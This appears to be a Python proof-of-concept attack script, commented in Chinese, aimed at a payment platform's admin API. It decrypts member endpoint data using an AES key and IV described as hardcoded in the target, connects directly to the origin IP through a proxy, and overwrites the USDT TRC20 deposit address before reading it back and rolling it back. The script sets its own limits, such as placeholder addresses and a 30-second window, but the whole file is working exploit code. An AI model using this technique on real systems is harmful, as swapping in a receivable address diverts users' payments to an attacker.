#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
payset_replace.py —— [靶标专用 POC / 未验证]
把「充值渠道配置」里的链上收款地址（configs.trc20）改掉，读回确认，再回滚。
依据：源码 plugin/admin/app/controller/PaysetController.php::update()
      + 部署版后台 dist（admin_dist/assets/index-BazhUfcu.js）明文反推的 URL 与 body 形状。

⚠️ 红线（必须遵守）：
  1. 一次只改一条渠道的一个字段；窗口 ≤30 秒（改→读回→回滚→再读回）。
  2. 只允许填「明显不可收款」的占位地址；任何真实可收款地址（base58check 通过）都不许写进去。
  3. 改前值必须先从 /api/recharge/methods 读出来并解密，原样回滚；原值为空就回滚成空。
  4. 若该写接口一改就会让充值页立刻对外展示新地址 → 先停，报指挥者批准。

运行环境：需要已确认 admin 后台可达（/app/admin/finance/payset-update 返回 JSON 而非 nginx 404），
         并把 ADMIN_BASE / HOST / 连接方式改成当时的真实值。
"""
import base64, json, subprocess, sys, time, hashlib
from Crypto.Cipher import AES

KEY = b"QD2024SecretKey1234567890ABCDEF0"      # app/Utils/Crypto.php 硬编码
IV = b"QD2024IV12345678"

TARGET_HOST = "example.com"               # 后台 Host（当前已下架，恢复后改回）
ORIG_IP = "203.0.113.88"
PROXY = "http://127.0.0.1:7892"
CURL = r"C:\Windows\System32\curl.exe"

PAYSET_UPDATE = "/app/admin/finance/payset-update"
MEMBER_METHODS = "/api/recharge/methods"     # 会员端零凭证读，用于读回校验
PAY_TYPE = "USDT"                             # 要改的渠道标识
NEW_TRC20 = "TFrBBJSXWPDb2CWRBAM7HEqdtray4x1Pb9"   # ← 只允许不可收款占位地址
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.26 Safari/537.36")


def _unpad(d):
    p = d[-1] if d else 0
    return d[:-p] if 1 <= p <= 16 and d[-p:] == bytes([p]) * p else d


def dec(b64):
    s = b64.strip()
    raw = base64.b64decode(s + "=" * (-len(s) % 4))
    return json.loads(_unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(raw)).decode("utf-8", "replace"))


def req(host, path, method="GET", body=None, timeout=25):
    args = [CURL, "-sS", "-k", "--http1.1", "-x", PROXY,
            "--connect-to", f"{host}:443:{ORIG_IP}:443",
            "-A", UA, "-H", "Accept: */*", "-H", "X-Requested-With: XMLHttpRequest",
            "-X", method, "--max-time", str(timeout)]
    if body is not None:
        args += ["-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    args.append(f"https://{host}{path}")
    p = subprocess.run(args, capture_output=True)
    txt = p.stdout.decode("utf-8", "replace")
    return txt


def read_member_methods():
    """会员端零凭证读取全部渠道配置（含 trc20Address / qrcode）"""
    return dec(req(TARGET_HOST if False else "example.com", MEMBER_METHODS))


def read_row(paytype):
    d = read_member_methods()
    for r in d["data"]:
        if (r.get("type") or "").upper() == paytype.upper():
            return r
    raise SystemExit(f"未找到 paytype={paytype} 的渠道")


def main():
    before = read_row(PAY_TYPE)
    orig = before.get("trc20Address") or ""
    print(f"[改前] {time.strftime('%H:%M:%S')}  trc20Address = {orig!r}")
    with open("payset_before.json", "w", encoding="utf-8") as f:
        json.dump(before, f, ensure_ascii=False, indent=1)

    if NEW_TRC20 == orig:
        raise SystemExit("新旧值相同，无需替换")

    # 除 trc20 外，其余字段原样回填（不改金额/限额/汇率/状态/启停）
    body = {
        "id": before["id"],
        "paytype": before["type"],
        "paytypetitle": before["title"],
        "ftitle": before.get("subtitle") or "",
        "minmoney": before.get("minAmount"),
        "maxmoney": before.get("maxAmount"),
        "isonline": 1 if before.get("isOnline") else 0,
        "state": 1,                       # /api/recharge/methods 只回 state=1 的行，故这里就是 1
        "remark": before.get("remark") or "",
        "configs_data[rate]": before.get("rate") if before.get("rate") is not None else 6.8,
        "configs_data[trc20]": NEW_TRC20,
        "configs_data[erc20]": before.get("erc20Address") or "",
    }
    if before.get("qrcode"):
        body["configs_data[ewmurl]"] = before["qrcode"]

    print(f"[替换] {time.strftime('%H:%M:%S')}  POST {PAYSET_UPDATE}  configs_data[trc20] -> {NEW_TRC20}")
    print("       body =", json.dumps(body, ensure_ascii=False))
    print("       resp =", req(TARGET_HOST, PAYSET_UPDATE, "POST", body)[:300].replace("\n", " "))

    t_write = time.time()
    after = read_row(PAY_TYPE)
    print(f"[改后] {time.strftime('%H:%M:%S')}  trc20Address = {after.get('trc20Address')!r} "
          f"({'生效' if after.get('trc20Address') == NEW_TRC20 else '未生效，立即排查'})")

    # ---- 立刻回滚 ----
    body["configs_data[trc20]"] = orig
    print(f"[回滚] {time.strftime('%H:%M:%S')}  回滚到 {orig!r}")
    print("       resp =", req(TARGET_HOST, PAYSET_UPDATE, "POST", body)[:300].replace("\n", " "))
    back = read_row(PAY_TYPE)
    print(f"[回滚后] {time.strftime('%H:%M:%S')}  trc20Address = {back.get('trc20Address')!r} "
          f"({'✔ 已恢复原值' if (back.get('trc20Address') or '') == orig else '✘ 未恢复，人工介入！'})")
    print(f"[窗口] {time.time() - t_write:.1f} 秒（上限 30s）")


if __name__ == "__main__":
    main()
